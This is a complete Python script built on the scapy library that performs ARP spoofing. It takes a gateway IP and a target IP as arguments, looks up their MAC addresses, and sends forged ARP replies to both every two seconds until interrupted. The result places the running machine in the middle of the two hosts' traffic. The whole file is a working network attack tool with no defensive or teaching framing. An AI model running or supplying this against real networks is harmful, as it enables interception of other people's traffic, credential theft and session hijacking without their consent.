import scapy.all as scapy
import sys
import time


def get_mac_address(ip_address):
    broadcast_layer = scapy.Ether(dst='ff:ff:ff:ff:ff:ff')
    arp_layer = scapy.ARP(pdst=ip_address)

    get_mac_packet = broadcast_layer / arp_layer

    answer = scapy.srp(get_mac_packet, timeout=2, verbose=False)[0]

    if answer:
        return answer[0][1].hwsrc
    return None


def spoof(gateway_ip, target_ip, gateway_mac, target_mac):

    packet1 = scapy.ARP(op=2, hwdst=gateway_mac, pdst=gateway_ip, psrc=target_ip)
    packet2 = scapy.ARP(op=2, hwdst=target_mac, pdst=target_ip, psrc=gateway_ip)

    scapy.send(packet1, verbose=False)
    scapy.send(packet2, verbose=False)


target_ip = str(sys.argv[2])
gateway_ip = str(sys.argv[1])

target_mac = get_mac_address(target_ip)
gateway_mac = get_mac_address(gateway_ip)


try:
    while True:
        spoof(gateway_ip, target_ip, gateway_mac, target_mac)
        time.sleep(2)

except KeyboardInterrupt:
    print("\nClosing ARP Spoofer...")
    exit()